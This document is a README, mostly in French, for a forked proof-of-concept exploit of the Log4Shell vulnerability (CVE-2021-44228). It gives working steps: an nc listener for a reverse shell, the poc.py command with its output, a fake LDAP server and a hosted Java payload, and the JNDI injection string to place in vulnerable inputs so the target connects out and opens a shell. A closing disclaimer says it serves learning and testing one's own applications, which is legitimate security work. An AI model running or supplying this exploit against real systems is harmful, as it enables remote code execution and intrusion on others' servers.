# log4j-shell-poc

## forked from https://github.com/kozmer/log4j-shell-poc
A Proof-Of-Concept pour la CVE-2021-44228 <br><br>

Proof-of-concept (POC)
----------------------

Installer les dépendances python 

#### Requirements:
```bash
pip install -r requirements.txt
```
#### Usage:


* Démarrer un listener pour la connexion reverse shell <br>
```py
nc -lvnp 9001
```
* Lancer l'exploit <br>
**Note:** J'ai intégré le jdk de java qui est devenu lourd à récupérer (F*ck*ng License system Oracle)
```py
$ python3 poc.py --userip $iplistener --webport 8000 --lport 9001

[!] CVE: CVE-2021-44228
[!] Github repo: https://github.com/kozmer/log4j-shell-poc

[+] Exploit java class created success
[+] Setting up fake LDAP server

[+] Send me: ${jndi:ldap://$iplistener:1389/a}

Listening on 0.0.0.0:1389
```

Le script :
- Démarre un serveur web python hebergeant le payload Java (Exploit.class)
- Démarre un serveur LDAP sur le port 1389 (pour renvoyer la connexion vers le serveur web python)

L'exploit JNDI ${jndi:ldap://$iplistener:1389/a} (affiché par le script) déclenchera la connexion du serveur vulnérable vers vos services pour exécuter le reverse shell final

${jndi:ldap://$iplistener:1389/a} doit être passé dans les entrées vulnérables

<br>


Disclaimer
----------
This repository is not intended to be a one-click exploit to CVE-2021-44228. The purpose of this project is to help people learn about this vulnerability, and perhaps test their own applications (however there are better applications for this purpose, ei: [https://log4shell.tools/](https://log4shell.tools/)).
